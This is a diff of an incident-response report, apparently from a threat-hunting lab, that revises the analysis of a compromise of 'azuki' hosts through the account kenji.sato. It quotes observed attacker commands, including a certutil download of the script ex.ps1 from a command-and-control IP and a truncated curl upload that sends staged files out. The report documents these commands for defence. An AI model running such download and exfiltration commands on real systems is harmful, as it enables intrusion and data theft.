@@ -61,8 +61,9 @@ Exfiltration steps were then initiated by `"curl.exe" -F file=@C:\Windows\Logs\C
 
 # Technical Analysis
 ## Affected Systems & Data
-Due to insufficient network access controls, the unauthorized entity established initial access and waited (dwell time), before continuing operations. The threat actor successfully gained access over the following devices:
+Due to insufficient network access controls, the unauthorized entity established initial access and waited (dwell time), before continuing operations. The threat actor successfully gained access over the following devices and accounts:
 - `azuki-fileserver01`
+- `azuki-sl`
 - `kenji.sato`
   
 ## Evidence Sources & Analysis
@@ -70,15 +71,15 @@ After establishing initial access on November 19, 2025, network monitoring withi
 
 <img width="1168" height="304" alt="image" src="https://github.com/user-attachments/assets/bd9e8334-3d45-45f3-87eb-d2d452ae764d" />
 
-
-
-From the logs, the PowerShell script `ex.ps1` was downloaded into the staging directory `C:\Windows\Logs\CBS\` through the IP address `78.141.196.6`. The script then triggered events that collected credentials, prepared the data for exfiltration, and exfiltrated the stolen data through a cloud service. Evidence of persistence was found in the form of an obfuscated PowerShell file `svchost.ps1`. Anti-forensic attempts were apparent by the deletion of the PowerShell history file `ConsoleHost_history.txt`.<br>
+The remote IP `159.26.106.98` made a successful logon to the device `azuki-sl` through the compromised account `kenji.sato` at `2025-11-22T00:27:58.4166424Z`. After this point, suspicious actions were taken and malicious intent were apparent.<br>
 
 The earliest signs of malicious command execution point to the unauthorized download of a suspicious script by using legitimate system utilities with network access.
 
 <img width="1312" height="362" alt="image" src="https://github.com/user-attachments/assets/bdfc9daa-9aa9-45d9-a224-d1e78b632100" />
 
-The PowerShell script `ex.ps1` was downloaded at using the command `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1` which also established the first contact of the C2 server `78.141.196.6`.
+The PowerShell script `ex.ps1` was downloaded at using the command `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1` which also established the first contact of the C2 server `78.141.196.6`.<br>
+
+From the logs, the PowerShell script `ex.ps1` was downloaded into the staging directory `C:\Windows\Logs\CBS\` through the IP address `78.141.196.6`. The script then triggered events that collected credentials, prepared the data for exfiltration, and exfiltrated the stolen data through a cloud service. Evidence of persistence was found in the form of an obfuscated PowerShell file `svchost.ps1`. Anti-forensic attempts were apparent by the deletion of the PowerShell history file `ConsoleHost_history.txt`.<br>
 
 ## Indicators of Compromise (IoCs)
 ### C2 IP:
